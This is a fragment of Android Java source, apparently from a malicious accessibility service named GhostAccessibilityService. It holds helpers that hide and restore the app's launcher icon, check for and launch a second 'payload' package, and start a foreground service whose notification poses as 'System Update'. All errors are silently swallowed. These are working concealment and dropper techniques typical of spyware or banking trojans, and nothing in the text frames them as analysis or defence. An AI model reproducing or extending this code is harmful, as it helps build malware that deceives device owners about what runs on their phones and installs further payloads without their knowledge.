        return PayloadInstaller.installedInfo(this, PayloadInstaller.PAYLOAD_PACKAGE) != null;
    }

    static void hideLauncher(Context context) {
        try {
            context.getPackageManager().setComponentEnabledSetting(
                    new ComponentName(context.getPackageName(),
                            context.getPackageName() + ".LauncherAlias"),
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP);
        } catch (Throwable ignored) {}
    }

    static void showLauncher(Context context) {
        try {
            context.getPackageManager().setComponentEnabledSetting(
                    new ComponentName(context.getPackageName(),
                            context.getPackageName() + ".LauncherAlias"),
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP);
        } catch (Throwable ignored) {}
    }

    static void launchPayload(Context context) {
        PayloadInstaller.launch(context);
    }

    static void startHiddenService(Context context) {
        try {
            NotificationChannel channel = new NotificationChannel(
                    "ghost_service", "System Update", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE))
                    .createNotificationChannel(channel);
            Intent open = new Intent(context, MainActivity.class)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            PendingIntent content = PendingIntent.getActivity(context, 0, open,
                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
            Notification notification = new Notification.Builder(context, "ghost_service")
                    .setContentTitle("System Update")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setContentIntent(content)
                    .setOngoing(true)
                    .build();
            Intent serviceIntent = new Intent(context, GhostForegroundService.class);
            ContextCompat.startForegroundService(context, serviceIntent);
            ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE))
                    .notify(1, notification);
        } catch (Throwable ignored) {}
    }

    public static GhostAccessibilityService getInstance() {
        return instance;
    }

    @Override
    public void onInterrupt() { }

    @Override
    public void onDestroy() {
        instance = null;
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
